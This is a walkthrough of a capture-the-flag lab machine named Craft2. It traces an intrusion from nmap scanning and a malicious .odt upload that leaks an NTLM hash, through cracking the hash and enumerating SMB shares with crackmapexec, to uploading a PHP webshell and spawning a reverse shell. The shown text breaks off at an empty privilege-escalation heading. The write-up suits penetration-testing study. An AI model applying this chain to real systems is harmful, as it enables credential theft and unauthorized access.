## First enumeration with nmap 

```shell
# Nmap 7.94SVN scan initiated Fri Mar  1 15:21:40 2024 as: nmap -sC -sV -T4 -oN normal.txt -p 80,135,445,49666 -Pn 192.168.227.188
Nmap scan report for 192.168.227.188
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-01T14:23:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  1 15:23:20 2024 -- 1 IP address (1 host up) scanned in 99.51 seconds
```

## Enumerating Port 80

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/ca04a717-bf45-4c93-8020-108b0460bc10)

there's a web application runing on port `80` opening it on a browser, we got  web page running a craft web app

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/8a394fc5-4092-4828-8bf2-194615df1965)

there's a file upload function enabled. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/920f8ee7-9761-463c-b42b-27575c580652)

file only supports `.odt` file allowed. tried to bypass file upload failed. came to my mind to create an ntlm hash stealer file. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/5c483fc4-2741-4891-bd5d-3f1e42c13796)

after some research, found an [hash_stealer](https://github.com/rmdavy/badodf/). 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/81d06091-109d-4048-a7da-bcefa50efb02)

created the malicious odt file

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4dff2410-523c-49f0-82d5-48de19a3eb6a)

set a listener on smb server.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3b9805b7-e721-49d7-9fdb-4242c2851cd5)

uploaded the malicious odt file. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/eb56f637-f63b-4fb0-978b-b456a060fb43)

after some seconds, we got some `ntlm` hashes. 

```
thecybergeek::CRAFT2:aaaaaaaaaaaaaaaa:39487ca7e12027bddbc22aa2e35610b0:010100000000000080ab1259206cda01a239cb14e2ee4d1600000000010010005800710050004700620063005600500003001000580071005000470062006300560050000200100052004100670054007a00580069006c000400100052004100670054007a00580069006c000700080080ab1259206cda01060004000200000008003000300000000000000000000000003000009dad080303ea6ce68aafba3b7d64375d24e9232bf6346082091abd647f55ec070a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100390034000000000000000000
```
let's try to crack the hash.

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/79f5e49f-64fe-4c19-9786-c636d5007337)

cracked the password hash `winniethepooh`. `thecybergeek:winniethepooh`

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Craft2]
└─$ crackmapexec smb 192.168.195.188 -u thecybergeek -p winniethepooh --shares
SMB         192.168.195.188 445    CRAFT2           [*] Windows 10.0 Build 17763 x64 (name:CRAFT2) (domain:CRAFT2) (signing:False) (SMBv1:False)
SMB         192.168.195.188 445    CRAFT2           [+] CRAFT2\thecybergeek:winniethepooh 
SMB         192.168.195.188 445    CRAFT2           [-] Unexpected error with Neo4J
SMB         192.168.195.188 445    CRAFT2           [-] Account not found on the domain
SMB         192.168.195.188 445    CRAFT2           [*] Enumerated shares
SMB         192.168.195.188 445    CRAFT2           Share           Permissions     Remark
SMB         192.168.195.188 445    CRAFT2           -----           -----------     ------
SMB         192.168.195.188 445    CRAFT2           ADMIN$                          Remote Admin
SMB         192.168.195.188 445    CRAFT2           C$                              Default share
SMB         192.168.195.188 445    CRAFT2           IPC$            READ            Remote IPC
SMB         192.168.195.188 445    CRAFT2           WebApp          READ 
```
using `CME` to check for access, we got share on smb. 


```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/PGP/Craft2]
└─$ smbclient //192.168.195.188/WebApp/ -U thecybergeek 
Password for [WORKGROUP\thecybergeek]:
Try "help" to get a list of possible commands.
smb: \> dir 
  .                                   D        0  Tue Apr  5 17:16:03 2022
  ..                                  D        0  Tue Apr  5 17:16:03 2022
  assets                              D        0  Tue Apr  5 17:16:03 2022
  css                                 D        0  Tue Apr  5 17:16:03 2022
  index.php                           A     9768  Mon Jan 31 17:21:52 2022
  js                                  D        0  Tue Apr  5 17:16:03 2022
  upload.php                          A      896  Mon Jan 31 16:23:02 2022
  uploads                             D        0  Fri Mar  1 22:35:47 2024

                10327807 blocks of size 4096. 1582745 blocks available
smb: \> put shell.php 
putting file shell.php as \shell.php (0.7 kb/s) (average 0.7 kb/s)
smb: \> 
```
we login to the share and we also have file upload. we uploaded a `php` webshell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/99f7f31f-8f23-42bd-ab33-522277a1faea)

we trigger the web shell. let's spawn a reverse shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/618f5ed8-f21f-4c91-b5bf-7a6aad3d7efb)

we spawn a reverse shell. 


## Privilege escalation 


